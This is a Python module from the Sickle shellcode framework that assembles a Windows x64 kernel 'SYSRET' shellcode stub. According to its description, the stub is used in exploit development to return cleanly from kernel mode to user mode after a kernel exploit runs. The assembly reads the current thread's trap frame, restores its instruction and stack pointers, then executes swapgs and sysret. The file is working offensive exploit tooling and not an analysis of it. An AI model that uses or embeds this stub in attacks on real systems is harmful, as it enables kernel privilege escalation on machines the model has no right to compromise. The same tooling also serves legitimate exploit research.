import sys

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.mparser import argument_check

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = "Windows (x64) Kernel SYSRET Shellcode"

    module = f"{platform}/{arch}/kernel_sysret"

    example_run = f"{sys.argv[0]} -p windows/x64/kernel_sysret -f c"

    ring = 0

    author = ["Kristal-g",
              "wetw0rk"]

    tested_platforms = ["Windows 11 (10.0.26100 N/A Build 26100)",
                        "Windows 10 (10.0.19045 N/A Build 19045)"]

    summary = "Generic method of returning from kernel space to user space"

    description = ("This shellcode stub will restore a threads execution context, ultimately"
    " transitioning from kernel-mode to user-mode. This helps avoid manually having"
    " to restore execution flow from an exploit development perspective.")

    arguments = None

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        arg_object["architecture"] = Shellcode.arch
        self.builder = Assembler(Shellcode.arch)

        return

    def generate_source(self):
        """Generates source code to be assembled by the keystone engine
        """

        shellcode = """
        _start:
            mov rax, qword ptr gs:[0x188]    ; _KPCR.Prcb.CurrentThread
            mov cx, word ptr [rax + 0x1e4]   ; KTHREAD.KernelApcDisable
            inc cx
            mov word ptr [rax + 0x1e4], cx
            mov rdx, [rax + 0x90]            ; ETHREAD.TrapFrame
            mov rcx, [rdx + 0x168]           ; ETHREAD.TrapFrame.Rip
            mov r11, [rdx + 0x178]           ; ETHREAD.TrapFrame.EFlags
            mov rsp, [rdx + 0x180]           ; ETHREAD.TrapFrame.Rsp
            mov rbp, [rdx + 0x158]           ; ETHREAD.TrapFrame.Rbp
            xor eax, eax                     ;
            swapgs
            sysret                           ; Will get converted into sysretq
        """

        return shellcode

    def get_shellcode(self):
        """Generates Kernel SYSRET Shellcode
        """

        return self.builder.get_bytes_from_asm(self.generate_source())
